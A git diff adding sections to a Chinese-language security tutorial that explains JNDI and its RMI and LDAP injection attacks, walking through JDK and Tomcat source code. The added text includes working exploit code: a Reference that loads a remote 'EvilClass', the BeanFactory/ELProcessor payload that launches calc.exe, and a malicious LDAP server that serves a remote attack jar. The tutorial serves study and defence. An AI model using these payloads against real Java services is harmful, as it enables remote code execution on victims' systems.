@@ -1,13 +1,5 @@
 # 一文搞懂JNDI
 
-> 1.高版本bypasshttps://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/
->
-> 2.eki-rmi:https://tttang.com/archive/1430/
->
-> 3.eki-ldap: https://tttang.com/archive/1441/
->
-> 4.https://www.anquanke.com/post/id/197829
-
 ## 0x01 RMI
 
 `Remote Method Invocation` 远程方法调用，构建分布式应用程序，可以实现java跨`JVM`远程通信
@@ -1083,3 +1075,502 @@ jdk8u241，在调用`UnicastRef.invoke`之前，做了一个检测。
 ### 总结(EKI!!!)
 
 ![image-20220503220609196](https://img.dem0dem0.top/images/image-20220503220609196.png)
+
+## 0x02 JNDI
+
+> JNDI: JAVA名称和目录接口。`JNDI(Java Naming and Directory Interface)`是java提供的命名和目录服务，java可以通过他的API来命令和定位资源。可以访问的资源有:`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`
+
+- Naming
+
+  名称，实际上就是通过名称查找实际对象的服务。举个例子
+
+  > - DNS: 通过域名查找ip地址
+  > - QQ: 通过QQ号找到你这个用户
+  > - .....
+
+  这里就不得不提另外一个服务叫`LDAP`,是一个轻量级的目录访问服务。详情可以参考:https://paper.seebug.org/1091/#ldap。我们继续介绍Naming.
+
+  在名称系统中，有几个重要的概念。
+
+  - **Bindings**: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name（`HashMap(key=value)`)
+  - **Context**: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。(`二叉树的根节点或者子节点`)
+  - **References**: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以`引用(ref)`的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。
+
+- Directory
+
+     目录服务是对于命名服务的一个拓展，除了`Naming`中已经有的(`name==>value`)，之外，还给对象拥有了`attributes`,由此我们不仅可以通过name去搜索对象，还可以根据属性去搜索对象。
+
+     以打印机服务为例，我们可以在命名服务中根据打印机名称去获取打印机对象(引用)，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等**属性**，作为目录服务，用户可以根据打印机的分辨率去搜索对应的打印机对象。
+
+     常见服务:
+
+     - LDAP:上面已经说过。
+     - Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；
+     - 其他基于 X.500 (目录服务的标准) 实现的目录服务；
+
+
+     总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(`search`)操作去定位对象，而不是简单的根据名称查找(`lookup`)去定位。
+
+- Interface
+
+  JAVA为了方便使用上述的目录服务，实现了`JNDI`。从理解上,JNDI本身不是某一类特定的目录服务，所以可以针对不同的服务提供统一操作接口。
+
+  `JNDI`的架构主要是两层，应用层接口和SPI。
+
+  ![jndi](https://img.dem0dem0.top/images/ac18342889f64a129ffa97152e54b3b8.png)
+  JNDI 接口主要分为下述 5 个包:
+
+  - [javax.naming](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html)（命名操作）
+  - [javax.naming.directory](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html)(目录操作)
+  - [javax.naming.event](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html)(请求事件通知)
+  - [javax.naming.ldap](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html)
+  - [javax.naming.spi](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html)(允许动态插入不同实现，理解成为使JNDI能够访问自己定义的服务)
+
+  ### :new:Quick Start
+
+  ```java
+  package com.dem0.jndi;
+  
+  import javax.naming.Context;
+  import javax.naming.NamingException;
+  import javax.naming.directory.Attributes;
+  import javax.naming.directory.DirContext;
+  import javax.naming.directory.InitialDirContext;
+  import java.util.Hashtable;
+  
+  public class DNSContextFactoryTest {
+      public static void main(String[] args) {
+          //创建环境变量对象
+          Hashtable env = new Hashtable();
+          //设置JNDI初始化工厂累名
+          env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.dns.DnsContextFactory");
+          //设置JNDI提供服务的URL地址
+          env.put(Context.PROVIDER_URL,"dns://223.6.6.6/");
+          //创建JNDI目录服务对象
+          try {
+              DirContext context = new InitialDirContext(env);
+              //获取DNS解析记录测试
+              Attributes attrs1 = context.getAttributes("baidu.com", new String[]{"A"});
+              Attributes attrs2 = context.getAttributes("dem0dem0.top", new String[]{"A"});
+              System.out.println(attrs1);
+              System.out.println(attrs2);
+          } catch (NamingException e) {
+              e.printStackTrace();
+          }
+      }
+  }
+  ```
+
+  详细的解释已经在代码中标注，这里不再赘述。跟进代码看看。很明显重点的代码在`DirContext context = new InitialDirContext(env);`.
+
+  ```java
+  //跟进到最后javax.naming.spi.NamingManager.getInitialContext(Hashtable<?,?> env)
+  InitialContextFactoryBuilder builder = getInitialContextFactoryBuilder();
+  String className = env != null ?(String)env.get(Context.INITIAL_CONTEXT_FACTORY) : null;
+  //builder为null ==> factory = (InitialContextFactory)helper.loadClass(className).newInstance();
+  factory = builder.createInitialContextFactory(env);
+  return factory.getInitialContext(env);
+  ```
+
+  首先是`getInitialContextFactoryBuilder`去拿能够创建factory的`builder`。只有当这个builder没有被初始化的时候，才会去加载`Context.INITIAL_CONTEXT_FACTORY`,然后调用他的`getInitialContext`。
+
+  到这里让我们用JNDI来重写一下RMI。(这里也就能理解reg,server,client)
+
+  首先还是要新建Registery
+
+  ```java
+  LocateRegistry.createRegistry(1099);
+  ```
+
+  然后是server端来获取reg对象绑定对象
+
+  ```java
+  Hashtable env = new Hashtable();
+          env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
+          env.put(Context.PROVIDER_URL,"rmi://localhost:1099");
+          Calc calc = new Calc();
+          try {
+              InitialContext initialContext = new InitialContext(env);
+              initialContext.bind("calc",calc);
+              System.out.println("calc bindings");
+              initialContext.close();
+          } catch (NamingException e) {
+              e.printStackTrace();
+          }
+  ```
+
+  然后是client获取reg对象拿实例对象
+
+  ```java
+  Hashtable env = new Hashtable();
+          env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
+          env.put(Context.PROVIDER_URL,"rmi://localhost:1099");
+  
+          try {
+              InitialContext initialContext = new InitialContext(env);
+              ICalc calc = (ICalc) initialContext.lookup("calc");
+              initialContext.close();
+              List<Integer> li = new ArrayList<Integer>();
+              li.add(1);
+              li.add(2);
+              System.out.println(calc.sum(li));
+          } catch (NamingException e) {
+              e.printStackTrace();
+          } catch (RemoteException e) {
+              e.printStackTrace();
+          } catch (Exception e) {
+              e.printStackTrace();
+          }
+  ```
+
+  所以我们不难看出，任何一个`JNDI Context`中都有下面几个方法
+
+  ```java
+  bind(Name name, Object obj) 
+      将名称绑定到对象。 
+  list(String name) 
+      枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。
+  lookup(String name) 
+      检索命名对象。 
+  rebind(String name, Object obj) 
+      将名称绑定到对象，覆盖任何现有绑定。 
+  unbind(String name) 
+      取消绑定命名对象。
+  ```
+
+  对于`DirContext`来说，还支持`search/createSubcontext/getSchema/getSchemaClassDefinition`,这也符合我们之前所说的目录服务。
+
+  ### :key:JNDI动态协议转换
+
+  具体原理不用分析，省流量: JNDI会根据提供的URL重新寻找`INITIAL_CONTEXT_FACTORY`.
+
+  ### :eyes:JNDI中的Reference
+
+  目录服务中存在的一种特殊的对象`Reference`引用。他的构造方法有以下几种：
+
+  ![image-20220531221602256](https://img.dem0dem0.top/images/image-20220531221602256.png)
+  
+  这里面提到了`Reference`,那么绕不开的就还有`RefAddr`,这个就相当于是引用的一个指针。他有一个属性`addrType`表示地址类型。盲猜`URLClassLoader`,应该也用得上。
+  
+  ### :bulb:JNDI+RMI
+  
+  rmi: 提供了`ReferenceWrapper`用来将JNDI的`Reference`包装成一个远程对象。现在想办法把这个引用，怎么变成一个对象？
+  
+  ```java
+  public class User implements Serializable {
+      public String name;
+      public User(String name){
+          this.name = name;
+      }
+      public void who(){
+          System.out.println("I am "+ name);
+      }
+  
+      @Override
+      public String toString() {
+          return "User{" +
+                  "name='" + name + '\'' +
+                  '}';
+      }
+  }
+  ```
+  
+  服务端
+  
+  ```java
+  public class UserFactoryServer {
+      public static void main(String[] args) throws NamingException, RemoteException {
+          Registry registry = LocateRegistry.getRegistry(1099);
+          Reference reference = new Reference("com.dem0.jndi.model.xUser", "com.dem0.jndi.model.UserFactory", "http://127.0.0.1:1600");
+          ReferenceWrapper wrapper = new ReferenceWrapper(reference);
+          registry.rebind("User",wrapper);
+      }
+  }
+  ```
+  
+  clent
+  
+  ```java
+  public class UserFactoryClent {
+      public static void main(String[] args) throws NamingException {
+          System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
+          Hashtable<String, String> env = new Hashtable<>();
+          env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
+          env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
+          env.put("word","Dem0");
+          InitialContext ctx = new InitialContext(env);
+          User obj = (User) ctx.lookup("User");
+          System.out.println(obj);
+          obj.who();
+      }
+  }
+  ```
+  
+  debug一下流程，直接跳到`com.sun.jndi.rmi.registry.RegistryContext#lookup`
+  
+  ![image-20220531230257636](https://img.dem0dem0.top/images/image-20220531230257636.png)
+  
+  ![image-20220531230409469](https://img.dem0dem0.top/images/image-20220531230409469.png)
+  
+  拿到存根对象之后，进入decode
+  
+  ![image-20220531230545741](https://img.dem0dem0.top/images/image-20220531230545741.png)
+  
+  可以看到从这里开始，引用变实例了。通过`NamingManager.getObjectInstance`.
+  
+  ![image-20220531230921678](https://img.dem0dem0.top/images/image-20220531230921678.png)
+  
+  ![image-20220531231327818](https://img.dem0dem0.top/images/image-20220531231327818.png)
+  
+  可以看到最后还是调用`Reference`里面的`ObjectFactory#getObjectInstance`。但是这里也给了我们一个思路`codebase`.
+  
+  ![image-20220531231901475](https://img.dem0dem0.top/images/image-20220531231901475.png)
+  
+  但是前提还是要先绕过`trustURLCodebase`.
+  
+  这里的一个攻击思路就很明显了:`因为RegistryContext会解析ReferenceWrapper对象成Reference，如果Reference存在Factory的话还会进一步decode，从FactroyURL加载Factory并调用其getObjectInstance返回一个对象。本质上就是从远程加载类，直接开一个恶意类提供服务就行了。`
+  
+  ```java
+  eference reference = new Reference("whatever","EvilClass","http://localhost:16000/");
+  ReferenceWrapper wrapper = new ReferenceWrapper(reference);
+  registry.rebind("Foo", wrapper);
+  ```
+  
+  但是很显然高版本是默认关闭从远程加载的，但是本地的还是可以的。`org.apache.naming.factory.BeanFactory`+`EL`表达式还是可以的
+  
+  > 参考链接：https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java
+  
+  把代码简化一下
+  
+  ```java
+  Reference ref = (Reference) obj;
+  
+  //加载refrence classname对应的类为beanClass,并实例化
+  String beanClassName = ref.getClassName();
+  Class<?> beanClass = null;
+  ClassLoader tcl = Thread.currentThread().getContextClassLoader();
+  if (tcl != null) {
+      beanClass = tcl.loadClass(beanClassName);
+  } else {
+      beanClass = Class.forName(beanClassName);
+  }
+  BeanInfo bi = Introspector.getBeanInfo(beanClass);
+  PropertyDescriptor[] pda = bi.getPropertyDescriptors();
+  Object bean = beanClass.getConstructor().newInstance();
+  //然后找Reference的forceString属性
+  RefAddr ra = ref.get("forceString");
+  Map<String, Method> forced = new HashMap<>();
+  String value = (String)ra.getContent();
+  Class<?> paramTypes[] = new Class[1];
+  paramTypes[0] = String.class;
+  String setterName;
+  int index;
+  //将对应Reference的forceString属性值以逗号分隔为param
+  for (String param: value.split(",")) {
+      param = param.trim();
+      //尝试将param分割成 x=y 的格式 或者xxx
+      index = param.indexOf('=');
+      //case 1: setterName = x param = y
+      if (index >= 0) {
+          setterName = param.substring(index + 1).trim();
+          param = param.substring(0, index).trim();
+      } else { //case 2:setterName = setXxxx （Java Bean规范）
+          setterName = "set" +
+                       param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
+                       param.substring(1);
+      }
+      //这里将beanClass对应的以setterName为名的参数为String类型的方法放进forced Map中，并以param为键值
+      forced.put(param,beanClass.getMethod(setterName, paramTypes));
+  }
+  //获取Reference的所有RefAddr，并遍历
+  Enumeration<RefAddr> e = ref.getAll();
+  while (e.hasMoreElements()) {
+      ra = e.nextElement();
+      String propName = ra.getType();
+      value = (String)ra.getContent();
+      Object[] valueArray = new Object[1];
+      //从forcemap里拿 propName（就是当前RefAddr的Type）对应的方法
+      Method method = forced.get(propName);
+      if (method != null) {
+          valueArray[0] = value;
+          //调用方法参数为value（就是当前RefAddr的Content）
+          method.invoke(bean, valueArray);
+          continue;
+      }
+      //遍历pda就是bean的属性描述
+      for (int i = 0; i<pda.length; i++) {
+          if (pda[i].getName().equals(propName)) {
+              Class<?> propType = pda[i].getPropertyType();
+              //只允许调用方法参数为几个基本类String/Double/Character/...且只能有一个参数的方法
+              if (propType.equals(String.class)) {
+                  valueArray[0] = value;
+              } else if (propType.equals(Character.class)
+                         || propType.equals(char.class)) {
+                  valueArray[0] =
+                      Character.valueOf(value.charAt(0));
+              }
+              //拿到对应写属性的方法，调用其方法写属性
+              Method setProp = pda[i].getWriteMethod();
+              setProp.invoke(bean, valueArray);
+              break;
+          }
+      }
+  }
+  //返回写完属性生成的bean
+  return bean;
+  ```
+  
+  大概总结一下流程，会新建`classname对应的类为beanClass`,然后根据`forceString`属性，的值来切分（“a=b”）,就会调用B方法，并且将以a为主键的字符串传进去。最经典的exp也就不难解释了。
+  
+  ```java
+  ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+  ref.add(new StringRefAddr("forceString", "x=eval"));
+  ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','/c','calc.exe']).start()\")"));
+  ReferenceWrapper wrapper = new ReferenceWrapper(ref);
+  ```
+  
+  浅蓝师傅： https://tttang.com/archive/1405/ 挖出了新的利用链。超爱eki的总结:
+  
+  - 恶意类有public修饰的无参构造方法（getConstructor().newInstance()所限）
+  - 恶意类有只有一个String.class类型参数的危险方法（paramTypes所限）
+  - 恶意类有只有一个基本类型参数的满足bean规范的（setXX）危险方法（paramTypes所限）
+  
+  ## 0x03 LDAP 
+  
+  其实更多的就是对于RMI和上面这两种了，LDAP感觉我碰到挺少的。其实也就是常见的两种存储方式
+  
+  - Reference
+  
+    > 高版本一样没有了
+  
+  - 序列化
+  
+    > 本地存在反序列化链子就可以。
+  
+  
+  
+  LDAPserver:
+  
+  ```java
+  package com.anbai.sec.jndi.injection;
+  
+  import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+  import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+  import com.unboundid.ldap.listener.InMemoryListenerConfig;
+  import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+  import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+  import com.unboundid.ldap.sdk.Entry;
+  import com.unboundid.ldap.sdk.LDAPResult;
+  import com.unboundid.ldap.sdk.ResultCode;
+  
+  import javax.net.ServerSocketFactory;
+  import javax.net.SocketFactory;
+  import javax.net.ssl.SSLSocketFactory;
+  import java.net.InetAddress;
+  
+  public class LDAPReferenceServerTest {
+  
+  	// 设置LDAP服务端口
+  	public static final int SERVER_PORT = 3890;
+  	// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
+  	public static final String BIND_HOST = "127.0.0.1";
+  	// 设置一个实体名称
+  	public static final String LDAP_ENTRY_NAME = "test";
+  	// 获取LDAP服务地址
+  	public static String LDAP_URL = "ldap://" + BIND_HOST + ":" + SERVER_PORT + "/" + LDAP_ENTRY_NAME;
+  	// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
+  	public static final String REMOTE_REFERENCE_JAR = "https://anbai.io/tools/jndi-test.jar";
+  
+  	// 设置LDAP基底DN
+  	private static final String LDAP_BASE = "dc=javasec,dc=org";
+  
+  	public static void main(String[] args) {
+  		try {
+  			// 创建LDAP配置对象
+  			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+  
+  			// 设置LDAP监听配置信息
+  			config.setListenerConfigs(new InMemoryListenerConfig(
+  					"listen", InetAddress.getByName(BIND_HOST), SERVER_PORT,
+  					ServerSocketFactory.getDefault(), SocketFactory.getDefault(),
+  					(SSLSocketFactory) SSLSocketFactory.getDefault())
+  			);
+  
+  			// 添加自定义的LDAP操作拦截器
+  			config.addInMemoryOperationInterceptor(new OperationInterceptor());
+  
+  			// 创建LDAP服务对象
+  			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+  
+  			// 启动服务
+  			ds.startListening();
+  			System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);
+  		} catch (Exception e) {
+  			e.printStackTrace();
+  		}
+  	}
+  
+  	private static class OperationInterceptor extends InMemoryOperationInterceptor {
+  
+  		@Override
+  		public void processSearchResult(InMemoryInterceptedSearchResult result) {
+  			String base  = result.getRequest().getBaseDN();
+  			Entry  entry = new Entry(base);
+  
+  			try {
+  				// 设置对象的工厂类名
+  				String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
+  				entry.addAttribute("javaClassName", className);
+  				entry.addAttribute("javaFactory", className);
+  
+  				// 设置远程的恶意引用对象的jar地址
+  				entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);
+  
+  				// 设置LDAP objectClass
+  				entry.addAttribute("objectClass", "javaNamingReference");
+  
+  				result.sendSearchEntry(entry);
+  				result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+  			} catch (Exception e1) {
+  				e1.printStackTrace();
+  			}
+  		}
+  
+  	}
+  }
+  ```
+  
+  client
+  
+  ```java
+  Context ctx = new InitialContext();
+  // 获取RMI绑定的恶意ReferenceWrapper对象
+  Object obj = ctx.lookup(LDAP_URL);
+  System.out.println(obj);
+  ```
+  
+  `ds.add("en=avv",object)`,可以绑定对象了就。
+  
+  ### 总结
+  
+  | 攻击类型                              | 适用jdk版本 | 需要条件             |
+  | ------------------------------------- | ----------- | -------------------- |
+  | JNDI+RMI (Reference Remote Factory)   | <7u21、6u45 | 无                   |
+  | JNDI+RMI (Reference Local Factory)    | 任意        | 调用端存在利用链     |
+  | JNDI+LDAP (Reference Remote Codebase) | <8u191      | 无                   |
+  | JNDI+LDAP (Serialize Object)          | 任意        | 调用端存在反序列化链 |
+  
+  
+
+## 0x03 参考资料
+
+> 1.高版本bypasshttps://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/
+>
+> 2.eki-rmi:https://tttang.com/archive/1430/
+>
+> 3.eki-ldap: https://tttang.com/archive/1441/
+>
+> 4.https://www.anquanke.com/post/id/197829
+>
+> 5.绕过：https://www.cnblogs.com/zpchcbd/p/14941783.html
+
